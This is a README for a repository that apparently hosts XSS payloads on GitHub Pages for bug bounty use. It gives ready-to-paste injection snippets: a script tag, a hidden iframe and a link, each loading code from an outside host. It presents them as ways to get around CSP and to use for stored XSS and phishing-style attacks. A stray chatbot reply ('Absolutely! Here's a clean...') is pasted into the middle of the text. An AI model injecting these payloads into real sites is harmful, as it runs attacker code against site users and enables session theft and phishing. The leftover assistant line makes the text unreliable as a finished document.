# XSS Payload Host (GitHub Pages)

This repository hosts XSS payloads via GitHub Pages. It is useful for security researchers, bug bounty hunters, or penetration testers to demonstrate and execute Cross-Site Scripting (XSS) payloads on vulnerable websites.

## Features

- Hosts external XSS scripts via GitHub Pages
- Bypasses CSP in some cases (depending on target site)
- Works with `<script src>`, `<iframe>`, and `<img>`-based injection
- Easy to use for PoC (Proof-of-Concept)

---

Absolutely! Here's a clean, well-formatted `README.md` section for **"How to Use"**, with proper markdown and code blocks to make it look professional and easy to read:

---


## How I Use It

Use this GitHub Pages setup to host my XSS payloads for testing real-world vulnerabilities during bug bounty hunting.

🔗 **Live Payload URL:**  
[https://yogsec.github.io/xss-test/](https://yogsec.github.io/xss-test/)

When I find a vulnerable parameter or input field that allows HTML/JS injection, I inject a `<script src>` or `<iframe>` pointing to my hosted payload. Here are a few ways I use it:

### 📜 Basic Script Injection

```bash
<script src="https://yogsec.github.io/xss-test/"></script>
```

### 🕵️‍♂️ Stealthy iframe Injection

```bash
<iframe src="https://yogsec.github.io/xss-test/" style="display:none"></iframe>
```

### 🔗 Clickable Link Payload

```bash
<a href="https://yogsec.github.io/xss-test/">Click Here</a>
```

This method is useful on targets where CSP policies restrict inline scripts, but allow loading scripts or frames from external sources. It’s also handy for stored XSS and phishing-style payloads.

> ⚠️ Use only for ethical hacking and responsible disclosure.


